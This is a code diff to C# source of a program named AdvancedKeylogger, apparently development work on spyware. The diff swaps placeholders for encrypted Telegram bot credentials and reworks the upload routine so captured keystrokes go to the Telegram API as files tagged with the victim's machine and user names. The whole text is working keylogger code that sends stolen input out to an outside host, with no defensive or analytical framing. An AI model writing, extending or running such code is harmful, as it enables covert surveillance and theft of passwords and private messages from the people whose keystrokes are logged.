@@ -20,10 +20,9 @@ namespace AdvancedKeylogger
         private static string _logPath = null!;
 
         // --- ENCRYPTED CREDENTIALS (AES-256-CBC, Base64) ---
-        // Generate with: GenerateCredentials.exe YOUR_BOT_TOKEN YOUR_CHAT_ID
-        private const string EncryptedBotToken = "encrypt";
-        private const string EncryptedChatId = "encrypt";
-        // ----------------------------------------------------
+        // Generate with: encrypt.exe YOUR_BOT_TOKEN YOUR_CHAT_ID
+        private const string EncryptedBotToken = "cTrxzJZMRMQBeuKwYfrS2JVki04ZEhk9yorJxDiWh5PKu2hIk70afqf6KoHT1YdG";
+        private const string EncryptedChatId = "bLyRAKoA04Mvvi+qDhvu9A==";
 
         private static readonly string _botToken;
         private static readonly string _chatId;
@@ -154,18 +153,26 @@ namespace AdvancedKeylogger
 
         private static async Task SendAsDocument(string content, int lineCount)
         {
-            string fileName = $"kl_{DateTime.UtcNow:yyyyMMdd_HHmmss}.txt";
+            string machine = Environment.MachineName;
+            string user = Environment.UserName;
+            string timestamp = DateTime.UtcNow.ToString("yyyyMMdd_HHmmss");
+            string fileName = $"{machine}_{user}_{timestamp}.txt";
             
             using var fileContent = new ByteArrayContent(Encoding.UTF8.GetBytes(content));
             fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("text/plain");
 
             using var formData = new MultipartFormDataContent();
             formData.Add(new StringContent(_chatId), "chat_id");
-            formData.Add(new StringContent($"Batch of {lineCount} keystrokes"), "caption");
+            formData.Add(new StringContent($"[{machine}\\{user}] {lineCount} keystrokes"), "caption");
             formData.Add(fileContent, "document", fileName);
 
             var response = await _http.PostAsync(
                 $"https://api.telegram.org/bot{_botToken}/sendDocument", formData);
+
+            if (response.IsSuccessStatusCode)
+                Console.WriteLine($"\n[Sent {lineCount} lines to Telegram as {fileName}]");
+            else
+                Console.WriteLine($"\n[Telegram send failed: {response.StatusCode}]");
         }
     }
 
